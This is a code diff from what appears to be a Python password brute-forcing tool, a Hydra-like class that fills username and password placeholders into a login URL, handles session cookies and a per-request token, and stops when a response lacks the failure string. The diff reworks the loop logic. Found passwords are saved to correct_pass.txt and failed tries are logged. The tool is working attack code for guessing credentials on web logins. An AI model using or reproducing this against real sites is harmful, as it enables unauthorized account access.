@@ -194,10 +194,9 @@ class Thuan_01():
                 password = word.strip('\r').strip('\n')
                 data0 = link.replace("^USER^", username)
                 data00 = data0.replace("^PASS^", password)
-                #data1 = link + data00
+                # data1 = link + data00
                 cookie1 = json.loads(cookie)
                 # data1 = {"chkSubmit": "ok", "txtLoginId": username, "txtPassword": password, "txtSel": 1}
-                # r
                 if len(token) > 1:
                     rq = requests.get(data00, cookies=cookie1)
                     content = rq.text
@@ -206,33 +205,48 @@ class Thuan_01():
                     data11 = link.replace("#", tk_value)
                     # value='32-chars'
                     r = requests.get(data11, cookies=cookie1)
+                    stop = self.stop.get()
+                    self.stop.put(stop)
+                    if stop is False:  # if find password dont doing more is false
+                        self.counter(max_words)
+                        if fail in r.text:
+                            with open("tries.txt", "a") as f:
+                                f.write(f"{password}\n")
+                                f.close()
+                            # print(f"Incorrect password {passwd}\n")
+                        else:
+                            self.stop.get()
+                            self.stop.put(True)
+                            time.sleep(3)
+                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
+                            with open("correct_pass.txt", "w") as f:
+                                f.write(password)
+                            break
+
+                    else:
+                        break
                 else:
                     r = requests.get(data00, cookies=cookie1)
-                stop = self.stop.get()
-                self.stop.put(stop)
-                if stop is False:  # if find password dont doing more is false
-                    self.counter(max_words)
-                    if fail in r.text:
-                        with open("tries.txt", "a") as f:
-                            f.write(f"{password}\n")
-                            f.close()
-                        # print(f"Incorrect password {passwd}\n")
-                    else:
-                        self.stop.get()
-                        self.stop.put(True)
-                        time.sleep(3)
-                        print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
-                        # correctpwd = True
-                        # print(f"Correct password {passwd}!\n")
-                        with open("correct_pass.txt", "w") as f:
-                            f.write(password)
-                        break
+                    stop = self.stop.get()
+                    self.stop.put(stop)
+                    if stop is False:  # if find password dont doing more is false
+                        self.counter(max_words)
+                        if fail in r.text:
+                            with open("tries.txt", "a") as f:
+                                f.write(f"{password}\n")
+                                f.close()
+                            # print(f"Incorrect password {passwd}\n")
+                        else:
+                            self.stop.get()
+                            self.stop.put(True)
+                            time.sleep(3)
+                            print("\n\t" + self.green("[+] Password Found: " + password + '\n'))
+                            with open("correct_pass.txt", "w") as f:
+                                f.write(password)
+                            break
 
-                else:
-                    break
-                # if os.path.isfile(temp_file):
-                # os.remove(os.path.abspath(temp_file))
-                # last_process_number = int(max_words / 500) + (max_words % 500 > 0)
+                    else:
+                        break
             if str(self.last_process_number) in str(current_process().name):
                 time.sleep(20)
                 stop = self.stop.get()
@@ -244,7 +258,7 @@ class Thuan_01():
             self.process_lock.release()
         except KeyboardInterrupt:
             self.process_lock.release()
-
+        
     def last_words_check(self, max_words, passwords_list, username, link, data, fail):
         while True:
             if self.stop is True:
